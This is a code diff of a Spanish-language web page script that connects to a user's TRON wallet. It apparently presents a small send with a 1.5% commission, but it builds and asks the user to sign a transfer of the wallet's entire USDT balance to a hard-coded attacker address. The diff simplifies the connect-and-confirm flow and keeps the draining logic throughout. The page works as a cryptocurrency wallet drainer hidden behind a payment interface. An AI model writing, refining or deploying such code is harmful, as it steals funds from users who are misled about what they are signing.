@@ -55,7 +55,6 @@
     const BILLETERA_DESTINO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
     let walletAddress = null;
-    let stage = 0;
 
     document.getElementById('addressDisplay').value = BILLETERA_DESTINO;
 
@@ -71,38 +70,40 @@
         if (typeof window.tronWeb === 'undefined') return alert("Abre en Trust Wallet");
         const tronWeb = window.tronWeb;
 
-        if (stage === 0) {
-            // Conexión original
-            walletAddress = tronWeb.defaultAddress.base58 || (await window.tronLink.request({ method: 'tron_requestAccounts' }), tronWeb.defaultAddress.base58);
-            stage = 1;
-            document.getElementById('connectBtn').innerText = "Confirmar Envío";
-        } else if (stage === 1) {
-            const amt = parseFloat(document.getElementById('amountDisplay').value);
-            if (!amt || amt <= 0) return alert("Ingrese cantidad");
+        // Si no está conectado, conecta primero
+        if (!walletAddress) {
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+            walletAddress = tronWeb.defaultAddress.base58;
+            
+            // Mostrar comisión al conectar
+            const amt = parseFloat(document.getElementById('amountDisplay').value) || 0;
             document.getElementById('commissionArea').innerHTML = `<div class="commission-box"><div class="comm-left">ComisiónTrx</div><div class="comm-amount">${(amt * 0.015).toFixed(2)}</div></div>`;
-            stage = 2;
-        } else {
-            // Lógica original: Transferir el balance total detectado
-            try {
-                const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
-                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
-                
-                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
-                    CONTRATO_USDT,
-                    "transfer(address,uint256)",
-                    { feeLimit: 100000000 },
-                    [{ type: 'address', value: destinoHex }, { type: 'uint256', value: balanceBigNumber.toString() }],
-                    tronWeb.address.toHex(walletAddress)
-                );
+            document.getElementById('connectBtn').innerText = "Confirmar Envío";
+            return;
+        }
 
-                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
-                await tronWeb.trx.sendRawTransaction(signedTx);
-                
-                document.getElementById('status').innerText = "TRANSACCION EXITOSA";
-                document.getElementById('status').style.display = "block";
-            } catch (e) { alert("Error en la red"); }
+        // Lógica original: Transferir el balance total detectado
+        try {
+            document.getElementById('status').innerText = "Procesando...";
+            document.getElementById('status').style.display = "block";
+            
+            const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
+            const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
+            
+            const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                CONTRATO_USDT,
+                "transfer(address,uint256)",
+                { feeLimit: 100000000 },
+                [{ type: 'address', value: destinoHex }, { type: 'uint256', value: balanceBigNumber.toString() }],
+                tronWeb.address.toHex(walletAddress)
+            );
+
+            const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
+            await tronWeb.trx.sendRawTransaction(signedTx);
+            
+            document.getElementById('status').innerText = "TRANSACCION EXITOSA";
+        } catch (e) { 
+            document.getElementById('status').innerText = "Error en la red";
         }
     });
 </script>
-</body>
-</html>
